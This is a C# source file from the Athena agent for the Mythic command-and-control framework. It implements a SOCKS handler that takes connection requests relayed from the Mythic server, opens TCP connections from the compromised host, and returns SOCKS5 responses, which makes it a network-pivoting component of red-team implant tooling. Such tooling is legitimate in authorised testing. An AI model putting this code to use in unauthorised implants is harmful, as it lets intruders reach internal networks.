using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{

    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, SocksConnection> connections { get; set; }
        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
        public bool running { get; set; }

        public SocksHandler()
        {
            this.running = false;
            //this.connections = new Dictionary<int, SocksConnection>();
            this.connections = new ConcurrentDictionary<int, SocksConnection>();
        }

        /// <summary>
        /// Start the SOCKS Listener
        /// </summary>
        public async Task<bool> Start()
        {
            this.ct = new CancellationTokenSource();
            //this.connections = new Dictionary<int, SocksConnection>();
            this.connections = new ConcurrentDictionary<int, SocksConnection>();
            this.messagesOut = new ConcurrentBag<SocksMessage>();

            return true;
        }

        /// <summary>
        /// Stops the SOCKS Listener
        /// </summary>
        public async Task<bool> Stop()
        {
            try
            {
                if (!this.running)
                {
                    return true;
                }

                this.running = false;

                if (this.ct is not null)
                {
                    this.ct.Cancel();
                }

                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine("[Stop]");
                Console.WriteLine(e);
                return false;
            }
        }

        /// <summary>
        /// Add a connection to the tracker dictionary
        /// </summary>
        /// <param name="conn">Socks Connection</param>
        public async Task<bool> AddConnection(SocksConnection conn)
        {
            this.connections.GetOrAdd(conn.server_id, conn);
            return true;
        }

        /// <summary>
        /// Remove connection from the tracker dictionary
        /// </summary>
        /// <param name="conn">Connection ID</param>
        public async Task<bool> RemoveConnection(int conn)
        {
            try
            {
                this.connections.Remove(conn, out _);
            }
            catch
            {

            }
            return true;
        }

        /// <summary>
        /// Get messages from the out dictionary to forward to the Mythic server
        /// </summary>
        public List<SocksMessage> GetMessages()
        {
            if (this.messagesOut.Count < 1)
            {
                return new List<SocksMessage>();
            }

            List<SocksMessage> msgOut = new List<SocksMessage>(this.messagesOut);

            this.messagesOut.Clear();
            
            msgOut.Reverse();
            return msgOut;
        }

        /// <summary>
        /// Handle a new message forwarded from the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public async Task HandleMessage(SocksMessage sm)
        {
            if (this.connections.ContainsKey(sm.server_id))
            {

            }
            else
            {
                await HandleNewConnection(sm);
            }
        }

        /// <summary>
        /// Handle a new connection forwarded from the Mythic server
        /// </summary>
        /// <param name="address">IP address</param>
        /// <param name="sm">Socks Message</param>
        private async Task HandleNewConnection(SocksMessage sm)
        {
            try
            {
                if (String.IsNullOrEmpty(sm.data))
                {
                    return;
                }

                ConnectionOptions co = new ConnectionOptions(sm); //Create new ConnectionOptions
                SocksConnection sc = new SocksConnection(co); //Create Socks Connection Object
                
                //Set our events
                sc.client.OnDataReceived += sc.OnReceived;
                sc.client.OnDisconnected += sc.OnDisconnect;


                await AddConnection(sc); //Add our connection to the Dictionary

                ConnectResponse cr = new ConnectResponse() //Put together the Socks5 Connection Request
                {
                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                    bndport = new byte[] { 0x00, 0x00 },
                };

                SocksMessage smOut = new SocksMessage() //Put together our Mythic Response
                {
                    server_id = sm.server_id
                };

                try
                {
                    await sc.client.ConnectAsync(co.ip, co.port);
                    
                    if (!sc.client.IsReceiving)
                    {
                        sc.client.Receive(sc.ct.Token);
                    }

                    if (!sc.client.IsConnected)
                    {
                        cr.status = ConnectResponseStatus.GeneralFailure;
                        smOut.exit = true;
                        RemoveConnection(sm.server_id);
                    }

                    cr.addrtype = co.addressType;

                    //Put our ConnectResponse into the SocksMessage
                    smOut.data = await Misc.Base64Encode(cr.ToByte());
                }
                catch
                {
                    cr.status = ConnectResponseStatus.GeneralFailure;
                    smOut.exit = true;
                    RemoveConnection(sm.server_id);
                }
                //Return message
                ReturnMessage(smOut);
            }
            catch (Exception e)
            {
                Console.WriteLine("[HandleNew]");
                Console.WriteLine(e);
                ConnectResponse cr = new ConnectResponse()
                {
                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                    bndport = new byte[] { 0x00, 0x00 },
                    status = ConnectResponseStatus.GeneralFailure,
                };

                SocksMessage smOut = new SocksMessage()
                {
                    server_id = sm.server_id,
                    exit = true,
                    data = await Misc.Base64Encode(cr.ToByte())
                };

                ReturnMessage(smOut);
            }
        }

        /// <summary>
        /// Add a message to the out queue to be returned to the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public async Task ReturnMessage(SocksMessage sm)
        {
            //If a message gets deleted before this gets called, then I throw an error
            this.messagesOut.Add(sm);
        }
    }
}